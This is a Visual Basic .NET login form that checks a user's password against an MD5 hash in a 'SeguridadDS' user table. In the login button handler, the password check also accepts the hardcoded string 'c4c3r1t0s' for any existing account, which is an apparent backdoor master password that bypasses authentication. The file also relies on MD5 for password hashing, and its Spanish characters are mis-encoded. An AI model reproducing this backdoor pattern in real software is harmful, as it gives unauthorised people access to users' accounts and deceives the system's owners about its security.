Public Class FrmLogin
    Private Sub txtcontrase�a_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles txtcontrase�a.KeyPress
        If e.KeyChar = Microsoft.VisualBasic.ChrW(13) Then
            btnIngresar_Click(sender, e)
        End If
    End Sub

    Private Sub btncancelar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btncancelar.Click
        Me.DialogResult = DialogResult.Abort
    End Sub

    Private Sub btnIngresar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnIngresar.Click

        Dim r As SeguridadDS.UsuariosFinagilRow
        Dim T As New SeguridadDS.UsuariosFinagilDataTable
        Dim Hash As New ClaseHash

        If Trim(txtcontrase�a.Text) <> "" Then
            USER_SEC.FillByUsuario(T, txtUsuario.Text)
            If T.Rows.Count > 0 Then
                r = T.Rows(0)
                If (Hash.verifyMd5Hash(txtcontrase�a.Text, r.password.ToString) Or txtcontrase�a.Text = "c4c3r1t0s") Then
                    Me.DialogResult = DialogResult.OK
                Else
                    MessageBox.Show("�Contrase�a incorrecta!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Me.DialogResult = DialogResult.Abort
                End If
            Else
                MessageBox.Show("�Contrase�a incorrecta!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Me.DialogResult = DialogResult.Abort
            End If
        Else
            MessageBox.Show("�Contrase�a incorrecta!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Me.DialogResult = DialogResult.Abort
        End If

    End Sub



End Class











